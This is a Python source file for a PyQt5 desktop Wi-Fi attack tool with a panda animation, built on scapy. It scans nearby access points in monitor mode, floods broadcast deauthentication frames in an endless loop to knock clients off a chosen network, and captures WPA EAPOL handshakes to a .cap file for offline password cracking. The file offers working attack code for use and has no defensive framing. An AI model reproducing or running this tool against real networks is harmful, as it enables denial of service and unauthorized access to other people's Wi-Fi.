
from PyQt5 import QtCore, QtGui, QtWidgets
from frames_list import panda_animation_frames
from time import sleep
from scapy.all import *
from random import choice
IFACE="wlp3s0mon"
class Ui_MainWindow(object):
    Deauther_isActive=False
    access_points=[]
    device_count=0
    scanboxHtml='''
            <html>
                <head>
                    <style>
                        table {
                            border-collapse: collapse;
                            width: 100%;
                        }
                        th, td {
                            border: 1px solid #dddddd;
                            padding: 8px;
                            text-align: center;
                        }
                        th {
                            background-color: #f2f2f2;
                        }
                    </style>
                </head>
                <body>
                    <table id="scan_table">
                        <tr>
                            <th>S No.</th>
                            <th>Name</th>
                            <th>BSSID</th>
                            <th>Channel</th>
                        </tr>
                    </table>
                </body>
            </html>
        '''
    dark_colors=['blue', 'green', 'purple', 'orange', 'brown', 'darkred', 'darkblue', 'darkgreen', 'darkcyan', 'darkmagenta']
    hasStartedOnce=False

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(809, 600)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.info_box = QtWidgets.QTextEdit(self.centralwidget)
        self.info_box.setGeometry(QtCore.QRect(0, 320, 361, 201))
        self.info_box.setFrameShape(QtWidgets.QFrame.Box)
        self.info_box.setFrameShadow(QtWidgets.QFrame.Plain)
        self.info_box.setObjectName("info_box")
        self.deauth_button = QtWidgets.QPushButton(self.centralwidget)
        self.deauth_button.setGeometry(QtCore.QRect(0, 520, 181, 36))
        self.deauth_button.setObjectName("deauth_button")
        self.scan_box = QtWidgets.QTextEdit(self.centralwidget)
        self.scan_box.setGeometry(QtCore.QRect(360, 30, 451, 521))
        self.scan_box.setObjectName("scan_box")
        self.Hash_button = QtWidgets.QPushButton(self.centralwidget)
        self.Hash_button.setGeometry(QtCore.QRect(180, 520, 181, 36))
        self.Hash_button.setObjectName("Hash_button")
        self.start_button = QtWidgets.QPushButton(self.centralwidget)
        self.start_button.setGeometry(QtCore.QRect(360, 0, 211, 31))
        self.start_button.setObjectName("start_button")
        self.Stop_button = QtWidgets.QPushButton(self.centralwidget)
        self.Stop_button.setGeometry(QtCore.QRect(570, 0, 241, 31))
        self.Stop_button.setObjectName("Stop_button")
        self.animation_box = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.animation_box.setGeometry(QtCore.QRect(0, -10, 361, 401))
        self.animation_box.setStyleSheet("QPlainTextEdit { background-color: black; color: white; }")
        font = QtGui.QFont()
        font.setFamily("AR PL UKai CN")
        font.setPointSize(4)
        font.setBold(True)
        font.setWeight(75)
        self.animation_box.setFont(font)
        self.animation_box.setObjectName("animation_box")
        self.comboBox = QtWidgets.QComboBox(self.centralwidget)
        self.comboBox.setGeometry(QtCore.QRect(0, 320, 361, 36))
        self.comboBox.setObjectName("comboBox")
        self.deauth_button.raise_()
        self.Hash_button.raise_()
        self.Stop_button.raise_()
        self.animation_box.raise_()
        self.scan_box.raise_()
        self.start_button.raise_()
        self.info_box.raise_()
        self.comboBox.raise_()
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 809, 25))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.deauth_button.setText(_translate("MainWindow", "De-Authentication"))
        self.Hash_button.setText(_translate("MainWindow", "Hash Capturing"))
        self.start_button.setText(_translate("MainWindow", "Start"))
        self.Stop_button.setText(_translate("MainWindow", "Stop"))
        self.animation_box.setPlainText(_translate("MainWindow",panda_animation_frames[0]))
        self.start_button.clicked.connect(self.start)
        self.comboBox.activated.connect(self.accessPoint_probe)
        self.info_box.setReadOnly(True)
        self.scan_box.setReadOnly(True)
        self.deauth_button.setEnabled(False)
        self.Hash_button.setEnabled(False)
        self.Stop_button.clicked.connect(self.stop)
        self.Stop_button.setEnabled(False)
        self.deauth_button.clicked.connect(self.deauth_clients)
        self.scan_box.setHtml(self.scanboxHtml)
        self.Hash_button.clicked.connect(self.handshake_capture)
        self.info_box.setHtml('''
        <!DOCTYPE html>
        <html>
            <head>
                <style>
                </style>
            </head>
            <body>
                <br>
                <br>
                <p></p>
            </body>
        </html>
    ''')
    def send_notification(self, noti):
        cursor = self.info_box.textCursor()
        cursor.movePosition(QtGui.QTextCursor.Start)
        cursor.insertHtml(f'<p>{noti}</p><hr>')
        self.info_box.setTextCursor(cursor)

    def device_found(self, device):
        if device not in self.access_points:
            self.hasStartedOnce=True
            self.device_count += 1
            self.access_points.append(device)
            self.comboBox.addItem(f"{device[1]}({device[0]})", device)
            device_html = f'''
                <tr style="color: {choice(self.dark_colors)};">
                    <td>{self.device_count}</td>
                    <td>{device[0]}</td>
                    <td>{device[1]}</td>
                    <td>{device[2]}</td>
                </tr>
            '''
            current_html = self.scan_box.toHtml()
            new_html = current_html.replace('</table>', f"{device_html} </table>")
            self.scan_box.setHtml(new_html)
    def deauth_clients(self):
        access_point=self.comboBox.currentData()
        self.deauther=deauth_class()
        self.deauther.formating(device=access_point)
        self.deauther.start()
        self.send_notification(f"Deauthentication has been started!!")
        print("deauthing started")
        self.Deauther_isActive=True

    def start(self):
        self.comboBox.clear()
        self.scan_box.setHtml(self.scanboxHtml)
        self.device_count=0
        self.access_points.clear()
        self.start_animation()
        self.start_scanning()
        self.start_button.setEnabled(False)
        self.deauth_button.setEnabled(True)
        self.Hash_button.setEnabled(True)
        self.Stop_button.setEnabled(True)
    
    def stop(self):
        self.hopper.terminate()
        self.wifi_scanner.terminate()
        self.panda_animation.terminate()
        self.animation_box.setPlainText(panda_animation_frames[0])
        self.Stop_button.setEnabled(False)
        self.start_button.setEnabled(True)
        if not self.hasStartedOnce:
            self.deauth_button.setEnabled(False)
            self.Hash_button.setEnabled(False)
        self.send_notification(f"Scanning has been stopped succesfully")
        if self.Deauther_isActive:
            self.deauther.terminate()
    def handshake_capture(self):
        self.handshake_capture_deauther=handshake_deauther()
        device=self.comboBox.currentData()
        self.handshake_capture_deauther.formating(device)
        self.handshake_capture_deauther.start()
        os.system("iw dev {} set channel {}".format(IFACE,device[2]))
        self.handshake_capture_worker=epol_capture()
        self.handshake_capture_worker.EPOL_signal.connect(self.EPOL_packets_captured)
        self.handshake_capture_worker.start()
        
    def EPOL_packets_captured(self,epol_packets):
        self.send_notification("EPOL packets have been captured")
        wrpcap("eapol_packets.cap", epol_packets)

    def start_animation(self):
        self.panda_animation=animate_thread()
        self.panda_animation.send_frame.connect(self.animate_box)
        self.panda_animation.start()

    def animate_box(self,frame):
        self.animation_box.setPlainText(str(frame))
    
    def start_scanning(self):
        self.wifi_scanner=find_devices()
        self.hopper=channel_hopper()
        self.wifi_scanner.found_signal.connect(self.device_found)
        self.hopper.start()
        self.wifi_scanner.start()
        self.send_notification("scanning has been started....")
        self.send_notification("scanning has been started....")
        self.send_notification("scanning has been started....")

    def accessPoint_probe(self,index):
        device=self.comboBox.itemData(index)
        self.send_notification(f"checking if {device[1]} is active")
        os.system("iw dev {} set channel {}".format(IFACE,device[2]))
        probe_packet=RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=device[1]) / Dot11ProbeReq() / Dot11Elt(ID="SSID", len=len("test"), info="test")
        response=srp(probe_packet,timeout=1,iface=IFACE, verbose=0)
        if response:
            print("device is still active")
            self.send_notification(f"device({device[0]} is active)")
            return
        else:
            print("device is not active")
            self.send_notification(f"device({device[0]} is not active)")
            self.send_notification(f"device({device[0]} is is now removed from queue)")
            self.comboBox.removeItem(index)

class epol_capture(QtCore.QThread):
    EPOL_signal=QtCore.pyqtSignal(list)
    def run(self):
        sniff(prn=self.packet_capture, iface=IFACE, timeout=20)
    def packet_capture(self,packet):
        self.EPOL_packets=[]
        if packet.haslayer(EAPOL) and len(self.EPOL_packets) < 10:
            self.EPOL_packets.append(packet)
        self.EPOL_signal.emit(self.EPOL_packets)
class handshake_deauther(QtCore.QThread):
    def formating(self,device):
        self.device=device
    def run(self):
        deauth_packet=RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.device[1], addr3=self.device[1]) / Dot11Deauth()
        print("sending deauth packet")
        for _ in range(1000):
            sendp(deauth_packet,iface=IFACE, inter=0.1, verbose=0)
            print("sent deauth packet")

class channel_hopper(QtCore.QThread):
    channels=[1,2,3,4,5,6,7,8,9,10,11]
    def run(self):
        while True:
            channel=choice(self.channels)
            os.system("iw dev {} set channel {}".format(IFACE,channel))
            sleep(0.2)

class deauth_class(QtCore.QThread):
    def formating(self,device):
        self.device=device
    def run(self):
        deauth_packet=RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.device[1], addr3=self.device[1]) / Dot11Deauth()
        print("sending deauth packet")
        while True:
            sendp(deauth_packet,iface=IFACE, inter=0.1, verbose=0)
            print("sent deaith packet")
        
class find_devices(QtCore.QThread):
    found_signal=QtCore.pyqtSignal(list)
    def run(self):
        sniff(iface=IFACE,prn=self.get_access_points)

    def get_access_points(self, packet):
        self.name, self.channel = self.extract_name_and_channel(packet)
        self.bssid = self.extract_bssid(packet)
        if self.name=="not found":
            pass
        else:
            self.device = [self.name, self.bssid, self.channel]
            # Emit the signal in the context of the main thread
            self.found_signal.emit(self.device)

    def extract_name_and_channel(self, packet):
        if packet.haslayer(Dot11Beacon):
            beacon_frame = packet[Dot11Beacon]

            if beacon_frame.payload and (beacon_frame.payload.ID == 0):
                name = beacon_frame.payload.info.decode("ascii")
            else:
                name = "not found"

            if beacon_frame.haslayer(Dot11EltDSSSet):
                channel_frame = beacon_frame[Dot11EltDSSSet]
                channel = channel_frame.channel
            else:
                channel = 0
        else:
            name="not found"
            channel="0"

        return name, channel

    def extract_bssid(self, packet):
        if packet.haslayer(Dot11):
            dot11_layer = packet[Dot11]
            bssid = dot11_layer.addr2 if dot11_layer.addr2 else "ff:ff:ff:ff:ff:ff"
        else:
            bssid = "ff:ff:ff:ff:ff:ff"
        return bssid
        
class animate_thread(QtCore.QThread):
    send_frame=QtCore.pyqtSignal(str)
    def run(self):
        while True:
            for i in panda_animation_frames:
                self.send_frame.emit(i)
                sleep(1/14)
            for i in reversed(panda_animation_frames[:-1]):
                self.send_frame.emit(i)
                sleep(1/14)

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
